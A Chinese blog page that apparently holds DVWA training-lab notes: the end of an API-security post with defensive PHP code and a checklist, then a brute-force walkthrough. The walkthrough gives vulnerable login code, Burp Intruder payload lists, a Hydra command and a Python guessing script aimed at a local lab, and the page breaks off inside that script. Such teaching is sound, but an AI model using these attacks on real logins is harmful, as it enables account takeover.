<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">API请求</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">1.</span> 验证OAuth Access <span class="built_in">Token</span></span><br><span class="line">    ↓</span><br><span class="line"><span class="number">2.</span> 检查<span class="built_in">Token</span>是否有效</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">3.</span> 检查Scope权限</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">4.</span> 检查限流</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">5.</span> 验证资源所有权</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">6.</span> 验证输入</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">7.</span> 执行操作</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">8.</span> 记录审计日志</span><br><span class="line">    ↓</span><br><span class="line"><span class="number">9.</span> 返回响应</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都失败：</strong></p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">攻击<span class="number">1</span>：无<span class="built_in">Token</span>访问</span><br><span class="line">结果：<span class="number">401</span> Unauthorized</span><br><span class="line"></span><br><span class="line">攻击<span class="number">2</span>：伪造<span class="built_in">Token</span></span><br><span class="line">OAuth服务器验证 → 失败 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击<span class="number">3</span>：越权访问</span><br><span class="line">Scope检查 + 所有权检查 → 拒绝</span><br><span class="line"></span><br><span class="line">攻击<span class="number">4</span>：批量赋值</span><br><span class="line">字段白名单 → 只允许特定字段</span><br><span class="line"></span><br><span class="line">攻击<span class="number">5</span>：<span class="keyword">DoS</span>攻击</span><br><span class="line">Redis限流 → 超过限制 → <span class="number">429</span> Too Many Requests</span><br><span class="line"></span><br><span class="line">攻击<span class="number">6</span>：SQL注入</span><br><span class="line">PDO预编译 → 无法注入</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="认证和授权"><a href="#认证和授权" class="headerlink" title="认证和授权"></a>认证和授权</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ✅ 使用OAuth 2.0或OpenID Connect</span></span><br><span class="line"><span class="comment">// ✅ 使用JWT但签名验证严格</span></span><br><span class="line"><span class="comment">// ✅ 使用Scope控制细粒度权限</span></span><br><span class="line"><span class="comment">// ✅ 每个endpoint都检查权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ❌ 不要：</span></span><br><span class="line"><span class="comment">// - 硬编码API密钥</span></span><br><span class="line"><span class="comment">// - 使用简单的API密钥认证</span></span><br><span class="line"><span class="comment">// - 不检查授权</span></span><br></pre></td></tr></table></figure>

<h3 id="限流和DoS防护"><a href="#限流和DoS防护" class="headerlink" title="限流和DoS防护"></a>限流和DoS防护</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用Redis限流</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rate_limit</span>(<span class="params"><span class="variable">$user_id</span>, <span class="variable">$limit</span>, <span class="variable">$window</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$redis</span> = <span class="keyword">new</span> <span class="title class_">Redis</span>();</span><br><span class="line">    <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6379</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;rate:<span class="subst">$user_id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$current</span> = <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">incr</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$current</span> == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$redis</span>-&gt;<span class="title function_ invoke__">expire</span>(<span class="variable">$key</span>, <span class="variable">$window</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$current</span> &lt;= <span class="variable">$limit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证所有输入</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_user_input</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$errors</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>], FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&#x27;Invalid email&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="variable">$errors</span>[] = <span class="string">&#x27;Username too short&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$errors</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="审计日志"><a href="#审计日志" class="headerlink" title="审计日志"></a>审计日志</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log_api_access</span>(<span class="params"><span class="variable">$user_id</span>, <span class="variable">$method</span>, <span class="variable">$path</span>, <span class="variable">$status</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$log</span> = [</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span> =&gt; <span class="variable">$user_id</span>,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span> =&gt; <span class="variable">$method</span>,</span><br><span class="line">        <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="variable">$status</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(</span><br><span class="line">        <span class="string">&#x27;/var/log/api_access.log&#x27;</span>,</span><br><span class="line">        <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>) . <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">        FILE_APPEND</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>认证</td>
<td>❌ 无</td>
<td>API密钥</td>
<td>JWT</td>
<td>OAuth 2.0</td>
</tr>
<tr>
<td>授权</td>
<td>❌ 无</td>
<td>❌ 无</td>
<td>基于角色</td>
<td>Scope+角色</td>
</tr>
<tr>
<td>限流</td>
<td>❌</td>
<td>简单文件</td>
<td>❌</td>
<td>Redis分布式</td>
</tr>
<tr>
<td>SQL注入防护</td>
<td>❌</td>
<td>✅ PDO</td>
<td>✅ PDO</td>
<td>✅ PDO</td>
</tr>
<tr>
<td>批量赋值防护</td>
<td>❌</td>
<td>白名单</td>
<td>白名单</td>
<td>严格白名单</td>
</tr>
<tr>
<td>审计日志</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ 完善</td>
</tr>
<tr>
<td>敏感信息</td>
<td>泄露</td>
<td>部分保护</td>
<td>保护</td>
<td>完全保护</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
</tbody></table>
<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
<ol>
<li>✅ 发现所有API端点</li>
<li>✅ 测试无认证访问</li>
<li>✅ 枚举用户ID</li>
<li>✅ 测试越权访问</li>
<li>✅ 测试批量赋值</li>
<li>✅ 测试SQL注入</li>
<li>✅ 测试限流</li>
<li>✅ JWT破解</li>
</ol>
<p><strong>防御清单：</strong></p>
<ol>
<li>✅ 使用OAuth 2.0</li>
<li>✅ 实施Scope权限</li>
<li>✅ 严格授权检查</li>
<li>✅ 分布式限流</li>
<li>✅ 输入验证</li>
<li>✅ 完善审计日志</li>
<li>✅ API版本管理</li>
<li>✅ 使用API网关</li>
</ol>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不攻击真实API</li>
<li>学习是为了构建安全API</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Brute_Force_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/Brute_Force_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - Brute Force (暴力破解) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:21:41" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是暴力破解（Brute-Force）？"><a href="#什么是暴力破解（Brute-Force）？" class="headerlink" title="什么是暴力破解（Brute Force）？"></a>什么是暴力破解（Brute Force）？</h3><p>暴力破解是一种试错方法，攻击者通过系统地尝试所有可能的密码组合来获取访问权限。</p>
<p><strong>常见场景：</strong></p>
<ul>
<li>登录表单</li>
<li>管理后台</li>
<li>API密钥</li>
<li>加密文件</li>
</ul>
<p><strong>危害：</strong></p>
<ul>
<li>未授权访问账户</li>
<li>数据泄露</li>
<li>权限提升</li>
<li>系统接管</li>
</ul>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>无任何防护的登录表单，可直接暴力破解。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了登录请求</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否已设置且非NULL</span></span><br><span class="line"><span class="comment">// $_GET - 超全局变量，获取URL中的GET参数</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 从URL参数获取用户名</span></span><br><span class="line">    <span class="comment">// 例如：?username=admin&amp;password=test&amp;Login=Login</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从URL参数获取密码并进行MD5哈希</span></span><br><span class="line">    <span class="comment">// md5() - 将字符串转换为32位十六进制MD5哈希值</span></span><br><span class="line">    <span class="comment">// 注意：MD5是单向加密，不可逆</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建SQL查询语句</span></span><br><span class="line">    <span class="comment">// 这里直接拼接变量到SQL语句中，存在SQL注入漏洞！</span></span><br><span class="line">    <span class="comment">// ` ` - 反引号用于包裹表名和列名（MySQL语法）</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="comment">// mysql_query() - 执行MySQL查询（已废弃，不安全）</span></span><br><span class="line">    <span class="comment">// or die() - 如果查询失败则输出错误并终止</span></span><br><span class="line">    <span class="comment">// mysql_error() - 返回上一个MySQL操作的错误信息</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否找到匹配的用户</span></span><br><span class="line">    <span class="comment">// mysql_num_rows() - 返回结果集中的行数</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// 登录成功</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取查询结果的一行数据</span></span><br><span class="line">        <span class="comment">// mysql_fetch_assoc() - 将结果行作为关联数组返回</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysql_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从数组中获取avatar字段的值</span></span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出欢迎信息</span></span><br><span class="line">        <span class="comment">// &#123;$user&#125; - 在双引号字符串中插入变量值</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出用户头像</span></span><br><span class="line">        <span class="comment">// &lt;img src=&quot;&quot;&gt; - HTML图片标签</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 登录失败</span></span><br><span class="line">        <span class="comment">// &lt;pre&gt; - HTML预格式化文本标签</span></span><br><span class="line">        <span class="comment">// &lt;br /&gt; - HTML换行标签</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭MySQL连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>存在的安全问题：</strong></p>
<ol>
<li><strong>使用GET请求</strong> - 密码明文显示在URL中，会被浏览器历史、代理服务器记录</li>
<li><strong>无输入验证</strong> - 直接使用用户输入</li>
<li><strong>SQL注入漏洞</strong> - 直接拼接SQL语句</li>
<li><strong>无防护机制</strong> - 没有任何限制：<ul>
<li>无登录尝试次数限制</li>
<li>无验证码</li>
<li>无延迟</li>
<li>无账户锁定</li>
<li>无IP黑名单</li>
</ul>
</li>
<li><strong>错误信息详细</strong> - SQL错误会直接显示</li>
</ol>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="方法1：使用Burp-Suite-Intruder"><a href="#方法1：使用Burp-Suite-Intruder" class="headerlink" title="方法1：使用Burp Suite Intruder"></a>方法1：使用Burp Suite Intruder</h4><p><strong>步骤1：抓取登录请求</strong></p>
<ol>
<li>打开Burp Suite，开启代理</li>
<li>浏览器访问 <code>http://dvwa.local/dvwa/vulnerabilities/brute/</code></li>
<li>尝试登录（例如：admin &#x2F; test）</li>
<li>在Burp Suite的Proxy → HTTP history中找到请求</li>
</ol>
<p><strong>步骤2：发送到Intruder</strong></p>
<ol>
<li>右键点击请求 → Send to Intruder</li>
<li>进入Intruder → Positions标签</li>
</ol>
<p><strong>步骤3：配置攻击位置</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dvwa/vulnerabilities/brute/?username=§admin§&amp;password=§test§&amp;Login=Login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>dvwa.local</span><br></pre></td></tr></table></figure>

<ol>
<li>点击 Clear § 清除所有标记</li>
<li>Attack type 选择 <code>Cluster bomb</code>（组合攻击）</li>
<li>标记username和password参数</li>
</ol>
<p><strong>步骤4：配置Payload</strong></p>
<p><strong>Payload set 1（用户名）：</strong></p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">root</span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">test</span></span><br></pre></td></tr></table></figure>

<p><strong>Payload set 2（密码）：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">password</span></span><br><span class="line"><span class="number">123456</span></span><br><span class="line"><span class="keyword">admin</span></span><br><span class="line"><span class="number">12345678</span></span><br><span class="line">qwerty</span><br><span class="line">abc123</span><br><span class="line">letmein</span><br></pre></td></tr></table></figure>

<p><strong>步骤5：开始攻击</strong></p>
<ol>
<li>点击 Start attack</li>
<li>观察 Length 列，长度不同的响应通常表示成功</li>
<li>或使用 Grep-Match 功能匹配 “Welcome to the password protected area”</li>
</ol>
<p><strong>步骤6：验证结果</strong></p>
<p>找到长度异常的请求，右键 → Show response in browser，验证登录成功。</p>
<h4 id="方法2：使用Hydra命令行工具"><a href="#方法2：使用Hydra命令行工具" class="headerlink" title="方法2：使用Hydra命令行工具"></a>方法2：使用Hydra命令行工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装hydra（Kali Linux自带）</span></span><br><span class="line">apt-get install hydra</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备用户名字典</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;admin&quot;</span> &gt; users.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root&quot;</span> &gt;&gt; users.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备密码字典</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;password&quot;</span> &gt; passwords.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;123456&quot;</span> &gt;&gt; passwords.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;admin&quot;</span> &gt;&gt; passwords.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行暴力破解</span></span><br><span class="line">hydra -L users.txt -P passwords.txt dvwa.local http-get-form \</span><br><span class="line"><span class="string">&quot;/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect:H=Cookie: security=low; PHPSESSID=你的session值&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>-L users.txt</code> - 用户名字典文件</li>
<li><code>-P passwords.txt</code> - 密码字典文件</li>
<li><code>http-get-form</code> - HTTP GET表单</li>
<li><code>^USER^</code> - 用户名占位符</li>
<li><code>^PASS^</code> - 密码占位符</li>
<li><code>:Username and/or password incorrect</code> - 失败标识</li>
<li><code>H=Cookie</code> - 添加Cookie头</li>
</ul>
<h4 id="方法3：Python脚本"><a href="#方法3：Python脚本" class="headerlink" title="方法3：Python脚本"></a>方法3：Python脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/brute/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Cookie（需要先登录DVWA获取）</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;low&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;你的session值&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名列表</span></span><br><span class="line">usernames = [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;user&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码列表</span></span><br><span class="line">passwords = [<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;letmein&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历所有组合</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> usernames:</span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="comment"># 构建请求参数</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: user,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: passwd,</span><br><span class="line">            <span class="string">&#x27;Login&#x27;</span>: <span class="string">&#x27;Login&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送请求</span></span><br><span 